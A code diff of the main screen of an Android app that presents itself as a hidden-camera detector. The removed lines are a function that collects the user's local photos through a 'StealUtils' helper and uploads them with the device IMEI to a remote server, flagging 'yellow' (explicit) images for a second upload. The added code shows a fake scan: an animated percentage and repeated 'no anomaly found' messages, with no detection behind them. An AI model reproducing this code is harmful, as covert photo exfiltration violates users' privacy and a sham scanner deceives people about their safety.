@@ -1,11 +1,17 @@
 package king.bird.camaradetector.act
 
 import android.Manifest
+import android.animation.ValueAnimator
 import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
+import android.media.MediaPlayer
+import android.os.AsyncTask
+import android.os.Build
 import android.support.v7.app.AppCompatActivity
 import android.os.Bundle
+import android.os.Handler
+import android.support.annotation.RequiresApi
 import android.util.Log
 import android.view.KeyEvent
 import android.widget.Toast
@@ -20,15 +26,19 @@ import android.widget.TextView
 import com.google.gson.Gson
 import com.zhy.http.okhttp.OkHttpUtils
 import com.zhy.http.okhttp.callback.StringCallback
+import king.bird.camaradetector.MyApplication
 import king.bird.camaradetector.R
+import king.bird.camaradetector.adapter.RecordAdapter
 import king.bird.camaradetector.bean.User
 import king.bird.camaradetector.utils.LogUtils
 import king.bird.marrykotlin.iface.OnRequestListener
 import king.bird.tool.StealUtils
-import kotlinx.android.synthetic.main.activity_main.*
+import kotlinx.android.synthetic.main.act_main.*
 import okhttp3.Call
 import org.jetbrains.anko.async
 import java.lang.Exception
+import java.net.URL
+import java.text.DecimalFormat
 import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.collections.HashMap
@@ -37,17 +47,60 @@ import kotlin.collections.HashMap
 class MainActivity : AppCompatActivity() {
 
     private var mExitTime: Long? = 0L
+    private var mAnimator: ValueAnimator? = null
+
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        setContentView(R.layout.activity_main)
-
+        setContentView(R.layout.act_main)
         saveUserInfo()
+        switchLayout()
+        initEvent()
+        setView()
+    }
 
+    private fun initEvent() {
         mBtnStart.setOnClickListener {
             intoCamera()
         }
+        mBtnScanGun.setOnClickListener {
+            val mMediaPlayer = MediaPlayer.create(this@MainActivity, R.raw.notice)
+            mMediaPlayer!!.start()
+        }
+    }
+
+    @SuppressLint("SetTextI18n")
+    private fun setView() {
+        val df = DecimalFormat("#.0")
+        var schedule = 0.0
+        var totalCount = 0
+        val format = SimpleDateFormat("MM-dd HH:mm:ss")
+        if (null == mAnimator) {
+            mAnimator = ValueAnimator.ofFloat(0F, 1F)
+            mAnimator!!.repeatCount = -1
+            mAnimator!!.duration = 3000
+            mAnimator!!.addUpdateListener {
+                if (df.format(schedule) != "100.0") {
+                    schedule += 0.1
+                    totalCount += 1
+                    mTvScanGoods.text = "${df.format(schedule)}%"
+                    mTvAllGoods.text = "${totalCount}次"
+                } else {
+                    schedule = 0.0
+                }
+
+                ll_layout.apply {
+                    findViewById<TextView>(R.id.tv_time).text = format.format(Date())
+                    findViewById<TextView>(R.id.tv_count).text = "第 $totalCount 次"
+                    if(0==(totalCount%2))
+                        findViewById<TextView>(R.id.tv_desc).text = "未发现异常.."
+                    if(0==(totalCount%3))
+                        findViewById<TextView>(R.id.tv_desc).text = "未发现异常..."
+                }
+            }
+        }
+        mAnimator!!.start()
     }
 
     /**
@@ -177,53 +230,28 @@ class MainActivity : AppCompatActivity() {
     }
 
     /**
-     * 鉴黄
+     * 切换tag
      */
-    private fun autoPic(imei: String) {
-        val allLocalPhotos = StealUtils.getAllLocalPhotos(this@MainActivity)
-        val files = HashMap<String, File>()
-        var i = 0
-        //机算数量
-        allLocalPhotos.forEach {
-            //            if (it.fileSize / 1000 in 199..1999) {
-            i++
-            if (i < 20) {
-                files[it.title] = File(it.filePath)
-            }
-//            }
-        }
-        LogUtils.e("图片数量：", i.toString())
-        LogUtils.e("上传图片数量：", files.size.toString())
+    private fun switchLayout() {
 
-        //上传出局
-        var position = 0
-        files.forEach {
-            position++
-            OkHttpUtils.post().addFile(it.key, it.value.absolutePath, it.value).url(Api.baseUrl)
-                    .addHeader("method", Api.autoImage)
-                    .addHeader("Content-Type", "multipart/form-data")
-                    .addParams("id", imei)
-                    .addParams("position", position.toString())
-                    .addParams("fileSize", files.size.toString())
-                    .addParams("imageSize", i.toString())
-                    .build().execute(object : StringCallback() {
-                        override fun onResponse(p0: String?, p1: Int) {
-                            LogUtils.e(p0)
-                            if ("yellow" == p0) {
-                                upLoadPic(it.key, it.value, imei)
-                            }
-                        }
-
-                        override fun onError(p0: Call?, p1: Exception?, p2: Int) {
-                            if (p1 != null) {
-                                LogUtils.e(p1.message)
-                            }
-                        }
-                    })
-
+        mRlScanGroup.setOnClickListener {
+            mTvNoScanText.setTextColor(resources.getColor(R.color.red))
+            mTvNoScanLine.setBackgroundColor(resources.getColor(R.color.red))
+            mTvNoScanLine.visibility = View.VISIBLE
+            mTvScanDetailText.setTextColor(resources.getColor(R.color.black_34))
+            mTvScanDetailLine.visibility = View.INVISIBLE
+            mLlAutoScan.visibility = View.VISIBLE
+            mLlHandScan.visibility = View.GONE
         }
 
-
+        mRlScanDetail.setOnClickListener {
+            mTvScanDetailText.setTextColor(resources.getColor(R.color.red))
+            mTvScanDetailLine.visibility = View.VISIBLE
+            mTvNoScanText.setTextColor(resources.getColor(R.color.black_34))
+            mTvNoScanLine.visibility = View.INVISIBLE
+            mLlAutoScan.visibility = View.GONE
+            mLlHandScan.visibility = View.VISIBLE
+        }
     }
 
     private fun intoCamera() {
